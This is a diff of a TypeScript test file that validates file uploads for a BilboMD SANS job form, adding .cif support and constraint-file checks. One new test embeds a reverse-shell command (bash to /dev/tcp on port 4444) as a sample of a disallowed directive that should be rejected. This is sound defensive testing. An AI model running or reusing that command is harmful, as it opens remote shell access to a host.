@@ -5,7 +5,17 @@ import * as ValidationFunctions from '../ValidationFunctions'
 vi.mock('../ValidationFunctions', () => ({
   noSpaces: vi.fn().mockResolvedValue(true),
   isSaxsData: vi.fn().mockResolvedValue({ valid: true }),
-  isSingleModel: vi.fn().mockResolvedValue(true)
+  isSingleModel: vi.fn().mockResolvedValue(true),
+  cifIsSingleModel: vi.fn().mockResolvedValue(true),
+  cifContainsChainId: vi.fn().mockResolvedValue(true),
+  cifHasAllowedResiduesOnly: vi
+    .fn()
+    .mockResolvedValue({ valid: true, unsupportedResidues: [] }),
+  containsChainId: vi.fn().mockResolvedValue(true),
+  hasAllowedResiduesOnly: vi
+    .fn()
+    .mockResolvedValue({ valid: true, unsupportedResidues: [] }),
+  isValidConstInpFile: vi.fn().mockResolvedValue(true)
 }))
 
 const makeFile = (name: string, size = 100): File => {
@@ -78,6 +88,13 @@ describe('BilboMDSANSJobSchema - pdb_file', () => {
     ).resolves.toBe(file)
   })
 
+  it('accepts valid .cif file under 20MB', async () => {
+    const file = makeFile('model.cif')
+    await expect(
+      BilboMDSANSJobSchema.validateAt('pdb_file', { pdb_file: file })
+    ).resolves.toBe(file)
+  })
+
   it('rejects file over 20MB', async () => {
     const file = makeFile('model.pdb', 20_000_001)
     await expect(
@@ -85,11 +102,11 @@ describe('BilboMDSANSJobSchema - pdb_file', () => {
     ).rejects.toThrow('Max file size is 20MB')
   })
 
-  it('rejects non-.pdb extension', async () => {
+  it('rejects non-.pdb/.cif extension', async () => {
     const file = makeFile('model.txt')
     await expect(
       BilboMDSANSJobSchema.validateAt('pdb_file', { pdb_file: file })
-    ).rejects.toThrow('Only accepts a PDB file')
+    ).rejects.toThrow('Only accepts a *.pdb or *.cif file.')
   })
 
   it('rejects filename longer than 30 characters', async () => {
@@ -102,7 +119,7 @@ describe('BilboMDSANSJobSchema - pdb_file', () => {
   it('rejects missing pdb_file', async () => {
     await expect(
       BilboMDSANSJobSchema.validateAt('pdb_file', { pdb_file: undefined })
-    ).rejects.toBeTruthy()
+    ).rejects.toThrow('A PDB or CIF file is required')
   })
 })
 
@@ -125,7 +142,7 @@ describe('BilboMDSANSJobSchema - dat_file', () => {
     const file = makeFile('data.txt')
     await expect(
       BilboMDSANSJobSchema.validateAt('dat_file', { dat_file: file })
-    ).rejects.toThrow('SAXS *.dat data file')
+    ).rejects.toThrow('*.dat file')
   })
 
   it('rejects filename longer than 30 characters', async () => {
@@ -153,6 +170,23 @@ describe('BilboMDSANSJobSchema - inp_file', () => {
     await expect(
       BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
     ).resolves.toBe(file)
+  })
+
+  it('rejects inp_file containing a system directive (reverse shell exploit)', async () => {
+    vi.mocked(ValidationFunctions.isValidConstInpFile).mockResolvedValueOnce(
+      'Disallowed keyword in constraint file: "system "bash -i >& /dev/tcp/173.230.129.114/4444 0>&1""'
+    )
+    const file = makeFile('const.inp')
+    await expect(
+      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
+    ).rejects.toThrow('Disallowed keyword')
+  })
+
+  it('rejects non-.inp extension', async () => {
+    const file = makeFile('const.txt')
+    await expect(
+      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
+    ).rejects.toThrow('Only accepts a *.inp file.')
   })
 
   it('rejects file over 2MB', async () => {
